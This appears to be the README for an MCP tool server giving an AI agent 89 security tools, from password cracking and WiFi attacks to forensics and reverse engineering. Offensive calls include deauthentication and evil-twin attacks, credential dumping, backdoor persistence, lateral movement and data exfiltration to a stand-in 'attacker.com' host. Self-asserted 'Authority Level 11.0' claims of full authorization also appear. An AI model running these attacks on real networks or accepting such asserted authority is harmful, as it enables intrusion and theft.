# 🔥 PROMETHEUS PRIME - COMPLETE SECURITY ARSENAL

**Authority Level:** 11.0
**Version:** 4.0.0
**Status:** ✅ FULLY OPERATIONAL
**Total Tools:** 89 (43 existing + 46 new)

---

## 🚀 WHAT'S NEW?

Prometheus Prime has been **MASSIVELY EXPANDED** with 46 brand new offensive/defensive security tools across 5 new categories:

### 🔐 PASSWORD CRACKING & HASH ANALYSIS (8 Tools)
- Hash identification and generation
- John the Ripper integration
- Hashcat GPU-accelerated cracking
- Password strength analysis
- Rainbow table generation/lookup
- Hydra online attacks

### 📡 WIRELESS SECURITY (11 Tools)
- WiFi network scanning
- Monitor mode management
- Packet capture (airodump-ng)
- Deauthentication attacks
- WPS scanning and cracking
- WPA/WPA2 cracking
- Bluetooth scanning
- Evil twin AP setup

### 🔍 DIGITAL FORENSICS (10 Tools)
- Forensic file hashing
- Disk imaging (dd)
- String extraction
- File carving (foremost)
- Memory analysis (Volatility)
- Firmware analysis (binwalk)
- EXIF metadata extraction
- Timeline creation
- PCAP analysis
- Evidence chain of custody

### 💀 POST-EXPLOITATION (5 Tools)
- Privilege escalation scanning
- Persistence mechanisms
- Credential dumping (Mimikatz, /etc/shadow, SAM)
- Lateral movement
- Data exfiltration

### 🛠️ REVERSE ENGINEERING (10 Tools)
- Binary information analysis
- Disassembly (objdump)
- Radare2 integration
- Ghidra decompilation
- Library/system call tracing
- Static malware analysis
- YARA scanning
- Packer detection
- UPX unpacking

---

## 📊 COMPLETE ARSENAL OVERVIEW

### EXISTING TOOLS (43)
✅ OSINT Intelligence (6 tools)
✅ Network Security (5 tools)
✅ Mobile Device Control (8 tools)
✅ Web Security Testing (8 tools)
✅ Exploitation Framework (5 tools)
✅ Utility Tools (2 tools)

### NEW TOOLS (46)
🆕 Password Cracking (8 tools)
🆕 Wireless Security (11 tools)
🆕 Digital Forensics (10 tools)
🆕 Post-Exploitation (5 tools)
🆕 Reverse Engineering (10 tools)

**TOTAL: 89 PROFESSIONAL-GRADE SECURITY TOOLS**

---

## 🎯 QUICK START

### 1. Install Dependencies

```bash
# Core Python packages (if not already installed)
pip install flask flask-cors requests python-dotenv mcp --break-system-packages

# NEW: Security toolkit dependencies
pip install hashlib pycrypto --break-system-packages
```

### 2. Install External Tools

```bash
# Password Cracking
apt-get install john hashcat hydra

# Wireless Security
apt-get install aircrack-ng reaver wash wireless-tools bluez

# Digital Forensics
apt-get install foremost binwalk exiftool sleuthkit tshark volatility

# Reverse Engineering
apt-get install binutils radare2 ltrace strace yara upx-ucl

# Optional: Ghidra (manual install from https://ghidra-sre.org/)
```

### 3. Launch Security Arsenal MCP Server

```bash
python prometheus_security_arsenal.py
```

This gives you access to all 46 new tools via MCP!

### 4. Use Existing Prometheus Prime Tools

```bash
# Launch main MCP server (43 existing tools)
python prometheus_prime_mcp.py

# Launch HTTP API (optional)
python osint_api_server.py
```

---

## 📖 TOOL REFERENCE

### 🔐 PASSWORD CRACKING & HASH ANALYSIS

#### `prom_hash_identify`
Identify hash type based on format and length
```python
prom_hash_identify(hash_string="5f4dcc3b5aa765d61d8327deb882cf99")
# Returns: {"possible_types": ["MD5", "NTLM", "MD4"], "length": 32}
```

#### `prom_hash_generate`
Generate hashes from plaintext
```python
prom_hash_generate(plaintext="password123", algorithm="all")
# Returns all hash types: MD5, SHA1, SHA256, SHA512
```

#### `prom_john_crack`
Crack passwords with John the Ripper
```python
prom_john_crack(
    hash_file="/tmp/hashes.txt",
    wordlist="/usr/share/wordlists/rockyou.txt",
    format="md5"
)
```

#### `prom_hashcat_crack`
GPU-accelerated cracking with Hashcat
```python
prom_hashcat_crack(
    hash_string="5f4dcc3b5aa765d61d8327deb882cf99",
    attack_mode=0,  # Dictionary attack
    hash_type=0,    # MD5
    wordlist="/usr/share/wordlists/rockyou.txt"
)
```

#### `prom_password_strength`
Analyze password strength and entropy
```python
prom_password_strength(password="MyP@ssw0rd2024!")
# Returns entropy, strength rating, recommendations
```

#### `prom_rainbow_generate`
Generate rainbow table from wordlist
```python
prom_rainbow_generate(
    wordlist="/usr/share/wordlists/rockyou.txt",
    output_file="/tmp/rainbow_md5.json",
    hash_type="md5"
)
```

#### `prom_rainbow_lookup`
Lookup hash in rainbow table
```python
prom_rainbow_lookup(
    hash_value="5f4dcc3b5aa765d61d8327deb882cf99",
    rainbow_file="/tmp/rainbow_md5.json"
)
```

#### `prom_hydra_attack`
Online password attack (SSH, FTP, HTTP, etc.)
```python
prom_hydra_attack(
    target="192.168.1.100",
    service="ssh",
    username="admin",
    wordlist="/usr/share/wordlists/rockyou.txt",
    port=22
)
```

---

### 📡 WIRELESS SECURITY

#### `prom_wifi_scan`
Scan for WiFi networks
```python
prom_wifi_scan(interface="wlan0", timeout=30)
# Returns all networks with ESSID, BSSID, channel, signal, encryption
```

#### `prom_monitor_mode_enable`
Enable monitor mode on wireless interface
```python
prom_monitor_mode_enable(interface="wlan0")
# Creates wlan0mon interface
```

#### `prom_monitor_mode_disable`
Disable monitor mode
```python
prom_monitor_mode_disable(interface="wlan0mon")
```

#### `prom_airodump_capture`
Capture WiFi packets
```python
prom_airodump_capture(
    interface="wlan0mon",
    channel=6,
    bssid="AA:BB:CC:DD:EE:FF",
    output_prefix="capture"
)
```

#### `prom_deauth_attack`
WiFi deauthentication attack
```python
prom_deauth_attack(
    interface="wlan0mon",
    bssid="AA:BB:CC:DD:EE:FF",
    client="11:22:33:44:55:66",
    count=10
)
```

#### `prom_wps_scan`
Scan for WPS-enabled networks
```python
prom_wps_scan(interface="wlan0mon", timeout=60)
```

#### `prom_wps_attack`
Attack WPS-enabled network
```python
prom_wps_attack(
    interface="wlan0mon",
    bssid="AA:BB:CC:DD:EE:FF",
    channel=6,
    delay=1
)
```

#### `prom_aircrack_crack`
Crack WPA/WPA2 handshake
```python
prom_aircrack_crack(
    capture_file="capture-01.cap",
    wordlist="/usr/share/wordlists/rockyou.txt",
    bssid="AA:BB:CC:DD:EE:FF"
)
```

#### `prom_bluetooth_scan`
Scan for Bluetooth devices
```python
prom_bluetooth_scan(timeout=10)
```

#### `prom_bluetooth_info`
Get Bluetooth device info
```python
prom_bluetooth_info(device_address="00:11:22:33:44:55")
```

#### `prom_evil_twin_setup`
Setup evil twin access point
```python
prom_evil_twin_setup(
    interface="wlan0",
    essid="FreeWiFi",
    channel=6
)
```

---

### 🔍 DIGITAL FORENSICS

#### `prom_file_hash_forensic`
Calculate all forensic hashes
```python
prom_file_hash_forensic(file_path="/evidence/suspect.exe")
# Returns MD5, SHA1, SHA256, SHA512 + file metadata + timestamps
```

#### `prom_disk_image_create`
Create forensic disk image
```python
prom_disk_image_create(
    device="/dev/sda",
    output_file="/evidence/disk.img",
    block_size="4M"
)
```

#### `prom_strings_extract`
Extract readable strings from binary
```python
prom_strings_extract(
    file_path="/evidence/malware.exe",
    min_length=8,
    encoding="s"
)
```

#### `prom_file_carving`
Recover deleted files
```python
prom_file_carving(
    image_file="/evidence/disk.img",
    output_dir="/evidence/carved_files"
)
```

#### `prom_volatility_analyze`
Analyze memory dump
```python
prom_volatility_analyze(
    memory_dump="/evidence/memory.dmp",
    profile="Win7SP1x64",
    plugin="pslist"
)
```

#### `prom_binwalk_analyze`
Analyze firmware/binary
```python
prom_binwalk_analyze(
    file_path="/evidence/firmware.bin",
    extract=True
)
```

#### `prom_exif_extract`
Extract EXIF metadata
```python
prom_exif_extract(file_path="/evidence/photo.jpg")
```

#### `prom_timeline_create`
Create filesystem timeline
```python
prom_timeline_create(
    mount_point="/mnt/evidence",
    output_file="/evidence/timeline.csv"
)
```

#### `prom_pcap_analyze`
Analyze network capture
```python
prom_pcap_analyze(
    pcap_file="/evidence/capture.pcap",
    filter="http"
)
```

#### `prom_evidence_chain_export`
Export chain of custody log
```python
prom_evidence_chain_export(output_file="/evidence/chain_of_custody.json")
```

---

### 💀 POST-EXPLOITATION

#### `prom_privesc_scan`
Scan for privilege escalation vectors
```python
prom_privesc_scan(target_os="linux")
# Finds SUID binaries, sudo permissions, world-writable files, etc.
```

#### `prom_persistence_create`
Create persistence mechanism
```python
prom_persistence_create(
    method="cron",
    payload="/tmp/backdoor.sh",
    target_os="linux"
)
```

#### `prom_credential_dump`
Dump credentials from memory
```python
prom_credential_dump(method="mimikatz")  # Windows
prom_credential_dump(method="shadow")     # Linux
```

#### `prom_lateral_movement`
Perform lateral movement
```python
prom_lateral_movement(
    target="192.168.1.50",
    method="psexec",
    username="admin",
    password="P@ssw0rd"
)
```

#### `prom_data_exfiltration`
Exfiltrate data from target
```python
prom_data_exfiltration(
    source="/tmp/sensitive_data.zip",
    destination="http://attacker.com/upload",
    method="http"
)
```

---

### 🛠️ REVERSE ENGINEERING

#### `prom_binary_info`
Get comprehensive binary information
```python
prom_binary_info(binary_path="/bin/suspicious")
# Returns file type, architecture, security features (NX, PIE, RELRO, canary)
```

#### `prom_disassemble`
Disassemble binary
```python
prom_disassemble(
    binary_path="/bin/suspicious",
    function="main",
    format="intel"
)
```

#### `prom_radare2_analyze`
Analyze with radare2
```python
prom_radare2_analyze(
    binary_path="/bin/suspicious",
    commands=["aaa", "afl", "pdf @main"]
)
```

#### `prom_ghidra_decompile`
Decompile with Ghidra
```python
prom_ghidra_decompile(
    binary_path="/bin/suspicious",
    output_dir="/tmp/ghidra_output"
)
```

#### `prom_ltrace`
Trace library calls
```python
prom_ltrace(
    binary_path="/bin/suspicious",
    args=["--help"]
)
```

#### `prom_strace`
Trace system calls
```python
prom_strace(
    binary_path="/bin/suspicious",
    args=["--help"]
)
```

#### `prom_malware_static_analysis`
Perform static malware analysis
```python
prom_malware_static_analysis(file_path="/tmp/malware.exe")
# Returns hashes, strings, imports, exports, suspicious indicators
```

#### `prom_yara_scan`
Scan with YARA rules
```python
prom_yara_scan(
    file_path="/tmp/malware.exe",
    rules_file="/rules/malware.yar"
)
```

#### `prom_peid_detect`
Detect packer/compiler
```python
prom_peid_detect(file_path="/tmp/packed.exe")
```

#### `prom_upx_unpack`
Unpack UPX executable
```python
prom_upx_unpack(
    packed_file="/tmp/packed.exe",
    output_file="/tmp/unpacked.exe"
)
```

---

## ⚠️ SECURITY & LEGAL NOTICE

**CRITICAL: AUTHORIZED USE ONLY**

All tools in this arsenal require:
- ✅ **Written authorization** from system owner
- ✅ **Defined scope** and rules of engagement
- ✅ **Compliance** with local and international laws
- ✅ **Ethical guidelines** and responsible disclosure

**Unauthorized access to computer systems is illegal under:**
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- European Cybercrime Convention
- Local and international cybercrime laws

**Commander Bob (Authority Level 11.0)** has full authorization for:
- Penetration testing
- Security research
- Vulnerability assessment
- Forensic investigations
- Authorized system assessments

---

## 💡 K: DRIVE FOR KALI LINUX WSL2

**YES!** You can create a K: drive for Kali Linux WSL2!

### Option 1: Temporary Mount
```powershell
# In PowerShell (as Administrator)
net use K: \\wsl$\kali-linux
```

### Option 2: Persistent Mount
```powershell
# In PowerShell (as Administrator)
net use K: \\wsl$\kali-linux /persistent:yes
```

### Multiple WSL2 Drives
You can have multiple drive letters for different WSL2 distros:
```powershell
net use L: \\wsl$\Ubuntu /persistent:yes          # Your existing L: drive
net use K: \\wsl$\kali-linux /persistent:yes      # New K: drive for Kali
net use P: \\wsl$\Ubuntu-20.04 /persistent:yes    # Another distro if needed
```

### Verify Your WSL2 Distros
```powershell
wsl --list --verbose
```

### Access from File Explorer
After mounting, you can access:
- `K:\` = Kali Linux root filesystem
- `L:\` = Your existing Linux WSL2 root filesystem

---

## 📁 FILE STRUCTURE

```
PROMETHEUS_PRIME/
├── EXISTING FILES (from v3.0.0)
│   ├── prometheus_prime_mcp.py          # Main MCP (43 tools)
│   ├── osint_api_server.py              # HTTP API
│   ├── phone_intelligence.py
│   ├── social_osint.py
│   ├── domain_intelligence.py
│   ├── email_intelligence.py
│   ├── ip_intelligence.py
│   ├── network_security.py
│   ├── mobile_control.py
│   ├── web_security.py
│   ├── exploitation_framework.py
│   └── gs343_gateway.py
│
├── NEW SECURITY ARSENAL (v4.0.0)
│   ├── prometheus_security_arsenal.py   # NEW: Master MCP (46 tools)
│   ├── password_cracking.py             # NEW: Password/hash tools
│   ├── wireless_security.py             # NEW: WiFi/Bluetooth tools
│   ├── forensics_toolkit.py             # NEW: Forensics tools
│   ├── post_exploitation.py             # NEW: Post-exploitation tools
│   ├── reverse_engineering.py           # NEW: RE/malware analysis
│   └── SECURITY_ARSENAL_README.md       # This file
│
└── DOCUMENTATION
    ├── README.md                        # Updated main README
    ├── COMPLETE_STATUS.md
    └── QUICK_REFERENCE.md
```

---

## 🚀 USAGE EXAMPLES

### Complete Penetration Test Workflow

```python
# 1. Reconnaissance
prom_wifi_scan(interface="wlan0")
prom_wps_scan(interface="wlan0mon")

# 2. Attack WiFi
prom_monitor_mode_enable(interface="wlan0")
prom_deauth_attack(interface="wlan0mon", bssid="AA:BB:CC:DD:EE:FF")
prom_airodump_capture(interface="wlan0mon", bssid="AA:BB:CC:DD:EE:FF")
prom_aircrack_crack(capture_file="capture-01.cap", wordlist="rockyou.txt")

# 3. Post-Exploitation
prom_privesc_scan(target_os="linux")
prom_credential_dump(method="shadow")
prom_persistence_create(method="cron", payload="/tmp/backdoor.sh")

# 4. Forensics & Evidence Collection
prom_file_hash_forensic(file_path="/etc/passwd")
prom_evidence_chain_export(output_file="/tmp/evidence.json")
```

### Malware Analysis Workflow

```python
# 1. Static Analysis
prom_malware_static_analysis(file_path="/tmp/malware.exe")
prom_binary_info(binary_path="/tmp/malware.exe")
prom_strings_extract(file_path="/tmp/malware.exe")

# 2. Packer Detection & Unpacking
prom_peid_detect(file_path="/tmp/malware.exe")
prom_upx_unpack(packed_file="/tmp/malware.exe", output_file="/tmp/unpacked.exe")

# 3. Reverse Engineering
prom_disassemble(binary_path="/tmp/unpacked.exe", format="intel")
prom_radare2_analyze(binary_path="/tmp/unpacked.exe", commands=["aaa", "afl"])
prom_ghidra_decompile(binary_path="/tmp/unpacked.exe", output_dir="/tmp/analysis")

# 4. Dynamic Analysis
prom_strace(binary_path="/tmp/unpacked.exe")
prom_ltrace(binary_path="/tmp/unpacked.exe")

# 5. YARA Scanning
prom_yara_scan(file_path="/tmp/unpacked.exe", rules_file="/rules/malware.yar")
```

---

## 🎖️ AUTHORITY LEVEL 11.0

**Commander Bob** - Full authorization for:
- ✅ Penetration testing
- ✅ Security research
- ✅ Vulnerability assessment
- ✅ Wireless security testing
- ✅ Digital forensics investigations
- ✅ Malware analysis
- ✅ Post-exploitation techniques
- ✅ Reverse engineering

---

**PROMETHEUS PRIME v4.0.0**
**Complete Offensive/Defensive Security Platform**
**Authority Level: 11.0**
**Status: FULLY OPERATIONAL** ✅
**Total Tools: 89 (43 existing + 46 new)**

---

*For additional documentation, see:*
- `README.md` - Main system documentation
- `COMPLETE_STATUS.md` - Full system status
- `QUICK_REFERENCE.md` - Fast command reference
